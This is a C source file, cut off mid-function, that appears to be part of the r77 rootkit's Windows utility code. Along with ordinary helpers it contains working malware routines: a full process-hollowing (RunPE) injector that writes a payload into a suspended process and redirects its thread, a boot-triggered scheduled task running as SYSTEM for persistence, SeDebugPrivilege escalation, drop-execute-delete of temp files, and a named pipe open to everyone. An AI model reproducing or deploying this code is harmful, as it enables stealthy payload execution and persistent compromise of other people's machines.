#include "r77win.h"
#include "ntdll.h"
#include <Psapi.h>
#include <Shlwapi.h>
#include <aclapi.h>
#include <taskschd.h>
#include <wchar.h>

BOOL GetRandomBytes(LPVOID buffer, DWORD size)
{
	BOOL result = FALSE;

	HCRYPTPROV cryptProvider;
	if (CryptAcquireContextW(&cryptProvider, NULL, L"Microsoft Base Cryptographic Provider v1.0", PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		if (CryptGenRandom(cryptProvider, size, buffer))
		{
			result = TRUE;
		}

		CryptReleaseContext(cryptProvider, 0);
	}

	return result;
}
BOOL GetRandomString(PWCHAR str, DWORD length)
{
	WCHAR characters[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

	if (GetRandomBytes(str, length * 2))
	{
		for (DWORD i = 0; i < length; i++)
		{
			str[i] = characters[str[i] % (sizeof(characters) / sizeof(WCHAR) - 1)];
		}

		str[length] = L'\0';
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}
LPCSTR ConvertStringToAString(LPCWSTR str)
{
	PCHAR result = NULL;

	int length = WideCharToMultiByte(CP_ACP, 0, str, -1, NULL, 0, NULL, NULL);
	if (length > 0)
	{
		result = NEW_ARRAY(CHAR, length);
		if (WideCharToMultiByte(CP_ACP, 0, str, -1, result, length, NULL, NULL) <= 0)
		{
			FREE(result);
			result = NULL;
		}
	}

	return result;
}
LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str)
{
	if (str.Buffer)
	{
		PWCHAR buffer = NEW_ARRAY(WCHAR, str.Length / sizeof(WCHAR) + 1);
		i_wmemcpy(buffer, str.Buffer, str.Length / sizeof(WCHAR));
		buffer[str.Length / sizeof(WCHAR)] = L'\0';

		return buffer;
	}
	else
	{
		return NULL;
	}
}
VOID Int32ToStrW(LONG value, PWCHAR buffer)
{
	if (value == 0)
	{
		buffer[0] = L'0';
		buffer[1] = L'\0';
		return;
	}

	if (value < 0)
	{
		*buffer++ = L'-';
		value = -value;
	}

	INT length = 0;
	for (LONG i = value; i; i /= 10)
	{
		length++;
	}

	for (INT i = 0; i < length; i++)
	{
		buffer[length - i - 1] = L'0' + value % 10;
		value /= 10;
	}

	buffer[length] = L'\0';
}

BOOL Is64BitOperatingSystem()
{
	BOOL wow64 = FALSE;
	return BITNESS(64) || IsWow64Process(GetCurrentProcess(), &wow64) && wow64;
}
BOOL IsAtLeastWindows10()
{
	RTL_OSVERSIONINFOW versionInfo;
	versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);

	// Unlike GetVersionEx, RtlGetVersion returns the actual windows version regardless of executable manifest.
	if (NT_SUCCESS(R77_RtlGetVersion(&versionInfo)))
	{
		return versionInfo.dwMajorVersion >= 10;
	}

	return FALSE;
}
BOOL Is64BitProcess(DWORD processId, LPBOOL is64Bit)
{
	BOOL result = FALSE;

	if (Is64BitOperatingSystem())
	{
		HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
		if (process)
		{
			BOOL wow64;
			if (IsWow64Process(process, &wow64))
			{
				*is64Bit = wow64 ? FALSE : TRUE;
				result = TRUE;
			}

			CloseHandle(process);
		}
	}
	else
	{
		*is64Bit = FALSE;
		result = TRUE;
	}

	return result;
}
LPVOID GetFunction(LPCSTR dll, LPCSTR function)
{
	HMODULE module = GetModuleHandleA(dll);
	return module ? (LPVOID)GetProcAddress(module, function) : NULL;
}
BOOL GetProcessIntegrityLevel(HANDLE process, LPDWORD integrityLevel)
{
	BOOL result = FALSE;

	HANDLE token;
	if (OpenProcessToken(process, TOKEN_QUERY, &token))
	{
		DWORD tokenSize;
		if (!GetTokenInformation(token, TokenIntegrityLevel, NULL, 0, &tokenSize) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
		{
			PTOKEN_MANDATORY_LABEL tokenMandatoryLabel = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, tokenSize);
			if (tokenMandatoryLabel)
			{
				if (GetTokenInformation(token, TokenIntegrityLevel, tokenMandatoryLabel, tokenSize, &tokenSize))
				{
					*integrityLevel = *GetSidSubAuthority(tokenMandatoryLabel->Label.Sid, *GetSidSubAuthorityCount(tokenMandatoryLabel->Label.Sid) - 1);
					result = TRUE;
				}

				LocalFree(tokenMandatoryLabel);
			}
		}

		CloseHandle(token);
	}

	return result;
}
BOOL GetProcessFileName(DWORD processId, BOOL fullPath, LPWSTR fileName, DWORD fileNameLength)
{
	BOOL result = FALSE;

	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
	if (process)
	{
		WCHAR path[MAX_PATH + 1];
		if (GetModuleFileNameExW(process, NULL, path, MAX_PATH))
		{
			PWCHAR resultFileName = fullPath ? path : PathFindFileNameW(path);
			if ((DWORD)lstrlenW(resultFileName) <= fileNameLength)
			{
				StrCpyW(fileName, resultFileName);
				result = TRUE;
			}
		}

		CloseHandle(process);
	}

	return result;
}
BOOL GetProcessUserName(HANDLE process, PWCHAR name, LPDWORD nameLength)
{
	BOOL result = FALSE;

	HANDLE token;
	if (OpenProcessToken(process, TOKEN_QUERY, &token))
	{
		DWORD tokenSize = 0;
		if (!GetTokenInformation(token, TokenUser, NULL, 0, &tokenSize) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
		{
			PTOKEN_USER tokenUser = (PTOKEN_USER)LocalAlloc(0, tokenSize);
			if (tokenUser)
			{
				if (GetTokenInformation(token, TokenUser, tokenUser, tokenSize, &tokenSize))
				{
					WCHAR domain[256];
					DWORD domainLength = 256;
					SID_NAME_USE sidType;
					result = LookupAccountSidW(NULL, tokenUser->User.Sid, name, nameLength, domain, &domainLength, &sidType);
				}

				LocalFree(tokenUser);
			}
		}

		CloseHandle(token);
	}

	return result;
}
BOOL EnabledDebugPrivilege()
{
	BOOL result = FALSE;

	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, GetCurrentProcessId());
	if (process)
	{
		HANDLE token;
		if (OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
		{
			LUID luid;
			if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid))
			{
				TOKEN_PRIVILEGES tokenPrivileges;
				tokenPrivileges.PrivilegeCount = 1;
				tokenPrivileges.Privileges[0].Luid = luid;
				tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				if (AdjustTokenPrivileges(token, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
				{
					result = GetLastError() != ERROR_NOT_ALL_ASSIGNED;
				}
			}
		}

		CloseHandle(process);
	}

	return result;
}
BOOL GetResource(DWORD resourceID, PCSTR type, LPBYTE *data, LPDWORD size)
{
	HRSRC resource = FindResourceA(NULL, MAKEINTRESOURCEA(resourceID), type);
	if (resource)
	{
		*size = SizeofResource(NULL, resource);
		if (*size)
		{
			HGLOBAL resourceData = LoadResource(NULL, resource);
			if (resourceData)
			{
				*data = (LPBYTE)LockResource(resourceData);
				return TRUE;
			}
		}
	}

	return FALSE;
}
BOOL GetPathFromHandle(HANDLE file, LPWSTR fileName, DWORD fileNameLength)
{
	BOOL result = FALSE;

	WCHAR path[MAX_PATH + 1];
	if (GetFinalPathNameByHandleW(file, path, MAX_PATH, FILE_NAME_NORMALIZED) > 0 && !StrCmpNIW(path, L"\\\\?\\", 4))
	{
		PWCHAR resultFileName = &path[4];
		if ((DWORD)lstrlenW(resultFileName) <= fileNameLength)
		{
			StrCpyW(fileName, resultFileName);
			result = TRUE;
		}
	}

	return result;
}
BOOL ReadFileContent(LPCWSTR path, LPBYTE *data, LPDWORD size)
{
	BOOL result = FALSE;

	HANDLE file = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file != INVALID_HANDLE_VALUE)
	{
		DWORD fileSize = GetFileSize(file, NULL);
		if (fileSize != INVALID_FILE_SIZE)
		{
			LPBYTE fileData = NEW_ARRAY(BYTE, fileSize);

			DWORD bytesRead;
			if (ReadFile(file, fileData, fileSize, &bytesRead, NULL) && bytesRead == fileSize)
			{
				*data = fileData;
				if (size) *size = fileSize;
				result = TRUE;
			}
			else
			{
				FREE(fileData);
			}
		}

		CloseHandle(file);
	}

	return result;
}
BOOL ReadFileStringW(HANDLE file, PWCHAR str, DWORD length)
{
	BOOL result = FALSE;

	for (DWORD count = 0; count < length; count++)
	{
		DWORD bytesRead;
		if (!ReadFile(file, &str[count], sizeof(WCHAR), &bytesRead, NULL) || bytesRead != sizeof(WCHAR))
		{
			result = FALSE;
			break;
		}

		if (str[count] == L'\0')
		{
			result = TRUE;
			break;
		}
	}

	return result;
}
BOOL WriteFileContent(LPCWSTR path, LPBYTE data, DWORD size)
{
	BOOL result = FALSE;

	HANDLE file = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file != INVALID_HANDLE_VALUE)
	{
		DWORD bytesWritten;
		result = WriteFile(file, data, size, &bytesWritten, NULL);
		CloseHandle(file);
	}

	return result;
}
BOOL CreateTempFile(LPBYTE file, DWORD fileSize, LPCWSTR extension, LPWSTR resultPath)
{
	BOOL result = FALSE;
	WCHAR tempPath[MAX_PATH + 1];

	if (GetTempPathW(MAX_PATH, tempPath))
	{
		WCHAR fileName[MAX_PATH + 1];
		if (GetRandomString(fileName, 8))
		{
			StrCatW(fileName, L".");
			StrCatW(fileName, extension);

			if (PathCombineW(resultPath, tempPath, fileName) && WriteFileContent(resultPath, file, fileSize))
			{
				result = TRUE;
			}
		}
	}

	return result;
}
BOOL ExecuteFile(LPCWSTR path, BOOL deleteFile)
{
	BOOL result = FALSE;

	STARTUPINFOW startupInfo;
	PROCESS_INFORMATION processInformation;
	i_memset(&startupInfo, 0, sizeof(STARTUPINFOW));
	i_memset(&processInformation, 0, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(startupInfo);

	if (CreateProcessW(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInformation))
	{
		WaitForSingleObject(processInformation.hProcess, 10000);
		CloseHandle(processInformation.hProcess);
		CloseHandle(processInformation.hThread);

		result = TRUE;
	}

	if (deleteFile)
	{
		for (int i = 0; i < 10; i++)
		{
			if (DeleteFileW(path)) break;
			Sleep(100);
		}
	}

	return result;
}
BOOL CreateScheduledTask(LPCWSTR name, LPCWSTR directory, LPCWSTR fileName, LPCWSTR arguments)
{
	BOOL result = FALSE;

	BSTR nameBstr = SysAllocString(name);
	BSTR directoryBstr = SysAllocString(directory);
	BSTR fileNameBstr = SysAllocString(fileName);
	BSTR argumentsBstr = SysAllocString(arguments);
	BSTR folderPathBstr = SysAllocString(L"\\");
	BSTR userIdBstr = SysAllocString(L"SYSTEM");

	if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
	{
		HRESULT initializeSecurityResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
		if (SUCCEEDED(initializeSecurityResult) || initializeSecurityResult == RPC_E_TOO_LATE)
		{
			ITaskService *service = NULL;
			if (SUCCEEDED(CoCreateInstance((LPCLSID)&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, (LPCLSID)&IID_ITaskService, (LPVOID*)&service)))
			{
				VARIANT empty;
				VariantInit(&empty);

				if (SUCCEEDED(service->lpVtbl->Connect(service, empty, empty, empty, empty)))
				{
					ITaskFolder *folder = NULL;
					if (SUCCEEDED(service->lpVtbl->GetFolder(service, folderPathBstr, &folder)))
					{
						ITaskDefinition *task = NULL;
						if (SUCCEEDED(service->lpVtbl->NewTask(service, 0, &task)))
						{
							ITaskSettings *settings = NULL;
							if (SUCCEEDED(task->lpVtbl->get_Settings(task, &settings)))
							{
								if (SUCCEEDED(settings->lpVtbl->put_StartWhenAvailable(settings, VARIANT_TRUE)) &&
									SUCCEEDED(settings->lpVtbl->put_DisallowStartIfOnBatteries(settings, VARIANT_FALSE)))
								{
									ITriggerCollection *triggerCollection = NULL;
									if (SUCCEEDED(task->lpVtbl->get_Triggers(task, &triggerCollection)))
									{
										ITrigger *trigger = NULL;
										if (SUCCEEDED(triggerCollection->lpVtbl->Create(triggerCollection, TASK_TRIGGER_BOOT, &trigger)))
										{
											IBootTrigger *bootTrigger = NULL;
											if (SUCCEEDED(trigger->lpVtbl->QueryInterface(trigger, (LPCLSID)&IID_IBootTrigger, (LPVOID*)&bootTrigger)))
											{
												IActionCollection *actionCollection = NULL;
												if (SUCCEEDED(task->lpVtbl->get_Actions(task, &actionCollection)))
												{
													IAction *action = NULL;
													if (SUCCEEDED(actionCollection->lpVtbl->Create(actionCollection, TASK_ACTION_EXEC, &action)))
													{
														IExecAction *execAction = NULL;
														if (SUCCEEDED(action->lpVtbl->QueryInterface(action, (LPCLSID)&IID_IExecAction, (LPVOID*)&execAction)))
														{
															if (SUCCEEDED(execAction->lpVtbl->put_WorkingDirectory(execAction, directoryBstr)) &&
																SUCCEEDED(execAction->lpVtbl->put_Path(execAction, fileNameBstr)) &&
																SUCCEEDED(execAction->lpVtbl->put_Arguments(execAction, argumentsBstr)))
															{
																VARIANT password;
																VariantInit(&password);

																VARIANT userId;
																VariantInit(&userId);
																userId.vt = VT_BSTR;
																userId.bstrVal = userIdBstr;

																VARIANT sddl;
																VariantInit(&sddl);

																IRegisteredTask *registeredTask = NULL;
																HRESULT hr = folder->lpVtbl->RegisterTaskDefinition(folder, nameBstr, task, TASK_CREATE_OR_UPDATE, userId, password, TASK_LOGON_SERVICE_ACCOUNT, sddl, &registeredTask);
																if (SUCCEEDED(hr))
																{
																	result = TRUE;

																	registeredTask->lpVtbl->Release(registeredTask);
																}
															}

															execAction->lpVtbl->Release(execAction);
														}

														action->lpVtbl->Release(action);
													}

													actionCollection->lpVtbl->Release(actionCollection);
												}

												bootTrigger->lpVtbl->Release(bootTrigger);
											}

											trigger->lpVtbl->Release(trigger);
										}

										triggerCollection->lpVtbl->Release(triggerCollection);
									}
								}

								settings->lpVtbl->Release(settings);
							}

							task->lpVtbl->Release(task);
						}

						folder->lpVtbl->Release(folder);
					}
				}

				service->lpVtbl->Release(service);
			}
		}

		CoUninitialize();
	}

	SysFreeString(nameBstr);
	SysFreeString(directoryBstr);
	SysFreeString(fileNameBstr);
	SysFreeString(argumentsBstr);
	SysFreeString(folderPathBstr);
	SysFreeString(userIdBstr);

	return result;
}
BOOL RunScheduledTask(LPCWSTR name)
{
	BOOL result = FALSE;

	BSTR nameBstr = SysAllocString(name);
	BSTR folderPathBstr = SysAllocString(L"\\");

	if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
	{
		HRESULT initializeSecurityResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
		if (SUCCEEDED(initializeSecurityResult) || initializeSecurityResult == RPC_E_TOO_LATE)
		{
			ITaskService *service = NULL;
			if (SUCCEEDED(CoCreateInstance((LPCLSID)&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, (LPCLSID)&IID_ITaskService, (LPVOID*)&service)))
			{
				VARIANT empty;
				VariantInit(&empty);

				if (SUCCEEDED(service->lpVtbl->Connect(service, empty, empty, empty, empty)))
				{
					ITaskFolder *folder = NULL;
					if (SUCCEEDED(service->lpVtbl->GetFolder(service, folderPathBstr, &folder)))
					{
						IRegisteredTask *task = NULL;
						if (SUCCEEDED(folder->lpVtbl->GetTask(folder, nameBstr, &task)))
						{
							VARIANT params;
							VariantInit(&params);

							IRunningTask *runningTask = NULL;
							if (SUCCEEDED(task->lpVtbl->Run(task, params, &runningTask)))
							{
								result = TRUE;

								runningTask->lpVtbl->Release(runningTask);
							}

							task->lpVtbl->Release(task);
						}

						folder->lpVtbl->Release(folder);
					}
				}

				service->lpVtbl->Release(service);
			}
		}

		CoUninitialize();
	}

	SysFreeString(nameBstr);
	SysFreeString(folderPathBstr);

	return result;
}
BOOL DeleteScheduledTask(LPCWSTR name)
{
	BOOL result = FALSE;

	BSTR nameBstr = SysAllocString(name);
	BSTR folderPathBstr = SysAllocString(L"\\");

	if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
	{
		HRESULT initializeSecurityResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
		if (SUCCEEDED(initializeSecurityResult) || initializeSecurityResult == RPC_E_TOO_LATE)
		{
			ITaskService *service = NULL;
			if (SUCCEEDED(CoCreateInstance((LPCLSID)&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, (LPCLSID)&IID_ITaskService, (LPVOID*)&service)))
			{
				VARIANT empty;
				VariantInit(&empty);

				if (SUCCEEDED(service->lpVtbl->Connect(service, empty, empty, empty, empty)))
				{
					ITaskFolder *folder = NULL;
					if (SUCCEEDED(service->lpVtbl->GetFolder(service, folderPathBstr, &folder)))
					{
						if (SUCCEEDED(folder->lpVtbl->DeleteTask(folder, nameBstr, 0)))
						{
							result = TRUE;
						}

						folder->lpVtbl->Release(folder);
					}
				}

				service->lpVtbl->Release(service);
			}
		}

		CoUninitialize();
	}

	SysFreeString(nameBstr);
	SysFreeString(folderPathBstr);

	return result;
}
HANDLE CreatePublicNamedPipe(LPCWSTR name)
{
	// Get security attributes for "EVERYONE", so the named pipe is accessible to all processes.

	SID_IDENTIFIER_AUTHORITY authority = SECURITY_WORLD_SID_AUTHORITY;
	PSID everyoneSid;
	if (!AllocateAndInitializeSid(&authority, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &everyoneSid)) return INVALID_HANDLE_VALUE;

	EXPLICIT_ACCESSW explicitAccess;
	i_memset(&explicitAccess, 0, sizeof(EXPLICIT_ACCESSW));
	explicitAccess.grfAccessPermissions = FILE_ALL_ACCESS;
	explicitAccess.grfAccessMode = SET_ACCESS;
	explicitAccess.grfInheritance = NO_INHERITANCE;
	explicitAccess.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	explicitAccess.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	explicitAccess.Trustee.ptstrName = (LPWSTR)everyoneSid;

	PACL acl;
	if (SetEntriesInAclW(1, &explicitAccess, NULL, &acl) != ERROR_SUCCESS) return INVALID_HANDLE_VALUE;

	PSECURITY_DESCRIPTOR securityDescriptor = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (!securityDescriptor ||
		!InitializeSecurityDescriptor(securityDescriptor, SECURITY_DESCRIPTOR_REVISION) ||
		!SetSecurityDescriptorDacl(securityDescriptor, TRUE, acl, FALSE)) return INVALID_HANDLE_VALUE;

	SECURITY_ATTRIBUTES securityAttributes;
	securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	securityAttributes.lpSecurityDescriptor = securityDescriptor;
	securityAttributes.bInheritHandle = FALSE;

	return CreateNamedPipeW(name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, NMPWAIT_USE_DEFAULT_WAIT, &securityAttributes);
}

BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit)
{
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);

	if (ntHeaders->Signature == IMAGE_NT_SIGNATURE)
	{
		switch (ntHeaders->OptionalHeader.Magic)
		{
			case IMAGE_NT_OPTIONAL_HDR32_MAGIC:
				*is64Bit = FALSE;
				return TRUE;
			case IMAGE_NT_OPTIONAL_HDR64_MAGIC:
				*is64Bit = TRUE;
				return TRUE;
		}
	}

	return FALSE;
}
BOOL RunPE(LPCWSTR path, LPBYTE payload)
{
	BOOL isPayload64Bit;
	if (IsExecutable64Bit(payload, &isPayload64Bit))
	{
		if (isPayload64Bit && BITNESS(32))
		{
			// Cannot inject 64-bit payload from 32-bit process.
			return FALSE;
		}

		if (!isPayload64Bit && BITNESS(64) && !IsAtLeastWindows10())
		{
			// Wow64 RunPE requires at least Windows 10.
			//TODO: Custom implementation for Wow64GetThreadContext and Wow64SetThreadContext required to work on Windows 7.
			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}

	// For 32-bit (and 64-bit?) process hollowing, this needs to be attempted several times.
	// This is a workaround to the well known stability issue of process hollowing.
	for (DWORD i = 0; i < 5; i++)
	{
		STARTUPINFOW startupInfo;
		PROCESS_INFORMATION processInformation;
		i_memset(&startupInfo, 0, sizeof(STARTUPINFOW));
		i_memset(&processInformation, 0, sizeof(PROCESS_INFORMATION));
		startupInfo.cb = sizeof(startupInfo);

		if (CreateProcessW(path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInformation))
		{
			if (isPayload64Bit == BITNESS(64))
			{
				// Payload bitness matches current process bitness

				PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
				R77_NtUnmapViewOfSection(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase);

				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
				{
					DWORD oldProtect;
					if (VirtualProtectEx(processInformation.hProcess, imageBase, ntHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect))
					{
						BOOL sectionsWritten = TRUE;
						PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(ntHeaders);
						for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
						{
							if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeaders[j].VirtualAddress, (LPBYTE)payload + sectionHeaders[j].PointerToRawData, sectionHeaders[j].SizeOfRawData, NULL))
							{
								sectionsWritten = FALSE;
								break;
							}

							if (!VirtualProtectEx(
								processInformation.hProcess,
								(LPBYTE)imageBase + sectionHeaders[j].VirtualAddress,
								j == ntHeaders->FileHeader.NumberOfSections - 1 ? ntHeaders->OptionalHeader.SizeOfImage - sectionHeaders[j].VirtualAddress : sectionHeaders[j + 1].VirtualAddress - sectionHeaders[j].VirtualAddress,
								SectionCharacteristicsToProtection(sectionHeaders[j].Characteristics),
								&oldProtect
							))
							{
								sectionsWritten = FALSE;
								break;
							}
						}

						if (sectionsWritten)
						{
							LPCONTEXT context = (LPCONTEXT)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
							if (context)
							{
								context->ContextFlags = CONTEXT_FULL;

								if (GetThreadContext(processInformation.hThread, context))
								{
#ifdef _WIN64
									if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Rdx + 16), &ntHeaders->OptionalHeader.ImageBase, 8, NULL))
									{
										context->Rcx = (DWORD64)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
										if (SetThreadContext(processInformation.hThread, context) &&
											ResumeThread(processInformation.hThread) != -1)
										{
											return TRUE;
										}
									}
#else
									if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, 4, NULL))
									{
										context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
										if (SetThreadContext(processInformation.hThread, context) &&
											ResumeThread(processInformation.hThread) != -1)
										{
											return TRUE;
										}
									}
#endif
								}
							}
						}
					}
				}
			}
			else
			{
				// Spawn 32-bit process from this 64-bit process.

				PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
				R77_NtUnmapViewOfSection(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase);

				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
				{
					DWORD oldProtect;
					if (VirtualProtectEx(processInformation.hProcess, imageBase, ntHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect))
					{
						BOOL sectionsWritten = TRUE;
						PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(ntHeaders);
						for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
						{
							if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeaders[j].VirtualAddress, (LPBYTE)payload + sectionHeaders[j].PointerToRawData, sectionHeaders[j].SizeOfRawData, NULL))
							{
								sectionsWritten = FALSE;
								break;
							}

							if (!VirtualProtectEx(
								processInformation.hProcess,
								(LPBYTE)imageBase + sectionHeaders[j].VirtualAddress,
								j == ntHeaders->FileHeader.NumberOfSections - 1 ? ntHeaders->OptionalHeader.SizeOfImage - sectionHeaders[j].VirtualAddress : sectionHeaders[j + 1].VirtualAddress - sectionHeaders[j].VirtualAddress,
								SectionCharacteristicsToProtection(sectionHeaders[j].Characteristics),
								&oldProtect
							))
							{
								sectionsWritten = FALSE;
								break;
							}
						}

						if (sectionsWritten)
						{
							PWOW64_CONTEXT context = (PWOW64_CONTEXT)VirtualAlloc(NULL, sizeof(WOW64_CONTEXT), MEM_COMMIT, PAGE_READWRITE);
							if (context)
							{
								context->ContextFlags = WOW64_CONTEXT_FULL;

								if (Wow64GetThreadContext(processInformation.hThread, context))
								{
									if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, 4, NULL))
									{
										context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
										if (Wow64SetThreadContext(processInformation.hThread, context) &&
											ResumeThread(processInformation.hThread) != -1)
										{
											return TRUE;
										}
									}
								}
							}
						}
					}
				}
			}
		}

		if (processInformation.dwProcessId != 0)
		{
			HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, processInformation.dwProcessId);
			if (process)
			{
				TerminateProcess(process, 0);
			}
		}
	}

	return FALSE;
}
DWORD SectionCharacteristicsToProtection(DWORD characteristics)
{
	if ((characteristics & IMAGE_SCN_MEM_EXECUTE) && (characteristics & IMAGE_SCN_MEM_READ) && (characteristics & IMAGE_SCN_MEM_WRITE))
	{
		return PAGE_EXECUTE_READWRITE;
	}
	else if ((characteristics & IMAGE_SCN_MEM_EXECUTE) && (characteristics & IMAGE_SCN_MEM_READ))
	{
		return PAGE_EXECUTE_READ;
	}
	else if ((characteristics & IMAGE_SCN_MEM_EXECUTE) && (characteristics & IMAGE_SCN_MEM_WRITE))
	{
		return PAGE_EXECUTE_WRITECOPY;
	}
	else if ((characteristics & IMAGE_SCN_MEM_READ) && (characteristics & IMAGE_SCN_MEM_WRITE))
	{
		return PAGE_READWRITE;
	}
	else if (characteristics & IMAGE_SCN_MEM_EXECUTE)
	{
		return PAGE_EXECUTE;
	}
	else if (characteristics & IMAGE_SCN_MEM_READ)
	{
		return PAGE_READONLY;
	}
	else if (characteristics & IMAGE_SCN_MEM_WRITE)
	{
		return PAGE_WRITECOPY;
	}
	else
	{
		return PAGE_NOACCESS;
	}
}
DWORD GetExecutableFunction(LPBYTE image, LPCSTR functionName)
{
	BOOL is64Bit;
	if (IsExecutable64Bit(image, &is64Bit))
	{
		PIMAGE_EXPORT_DIRECTORY exportDirectory;
		if (is64Bit)
		{
			PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
			exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(image + RvaToOffset(image, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
		}
		else
		{
			PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
			exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(image + RvaToOffset(image, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
		}

		LPDWORD nameDirectory = (LPDWORD)(image + RvaToOffset(image, exportDirectory->AddressOfNames));
		LPWORD nameOrdinalDirectory = (LPWORD)(image + RvaToOffset(image, exportDirectory->AddressOfNameOrdinals));

		for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++)
		{
			if (StrStrA((PCHAR)(image + RvaToOffset(image, *nameDirectory)), functionName))
			{
				return RvaToOffset(image, *(LPDWORD)(image + RvaToOffset(image, exportDirectory->AddressOfFunctions) + *nameOrdinalDirectory * sizeof(DWORD)));
			}

			nameDirectory++;
			nameOrdinalDirectory++;
		}
	}

	return 0;
}
DWORD RvaToOffset(LPBYTE image, DWORD rva)
{
